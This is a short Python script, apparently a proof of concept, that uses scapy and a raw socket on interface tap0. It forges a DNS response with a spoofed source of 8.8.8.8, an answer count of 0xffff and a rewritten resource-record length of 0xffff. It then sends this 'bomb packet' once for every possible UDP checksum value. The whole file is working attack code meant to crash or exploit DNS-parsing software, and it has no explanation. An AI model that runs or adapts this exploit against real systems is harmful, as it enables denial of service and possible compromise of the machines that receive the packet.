from scapy.all import *

if os.geteuid() != 0:
    exit("You need to have root privileges to run this script.\nPlease try again, this time using 'sudo'. Exiting.")

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
s.bind(("tap0", 0))

# sendp(
#     Ether(dst="11:22:33:44:55:66")/
#     IP(src="8.8.8.8", dst="192.168.0.2")/
#     UDP(sport=53, dport=0x1000)/
#     DNS(id=0, qdcount=1, ancount=0xffff, qr=1, aa=0, tc=0, rd=1, ra=1, z=0, rcode=0, an=DNSRR(rrname="www.google.com", type=1, rdata="127.0.0.1")), 
#     iface="tap0"
#     )

# sendp(Ether(dst="11:22:33:44:55:66")/IP(src="8.8.8.8", dst="192.168.0.2")/UDP(sport=53, dport=0x1000)/DNS(id=0, qdcount=1, ancount=0xffff, qr=1, aa=0, tc=0, rd=1, ra=1, z=0, rcode=0, an=DNSRR(rrname="www.google.com", type=1, rdata="127.0.0.1")), iface="tap0")

dport = 0x1000
# dport = 49152
b = bytes(Ether(dst="11:22:33:44:55:66")/IP(src="8.8.8.8", dst="192.168.0.2")/UDP(sport=53, dport=dport)/DNS(id=0, qdcount=1, ancount=0xffff, qr=1, aa=0, tc=0, rd=1, ra=1, z=0, rcode=0, qd=DNSQR(qname='www.google.com.', qtype=1, qclass=1), an=DNSRR(rrname="www.google.com.", type=1, rdata="127.0.0.1")))
b = b.replace('\x00\x04\x7f\x00\x00\x01', '\xff\xff\x7f\x00\x00\x01')

checksum = -1
if checksum < 0:
    for checksum in range(256 * 256):
        print checksum
        b = b[:0x28] + struct.pack('!H', checksum) + b[0x28+2:]
        s.send(b) # bomb packet
else:
    b = b[:0x28] + struct.pack('!H', checksum) + b[0x28+2:]
    s.send(b) # bomb packet
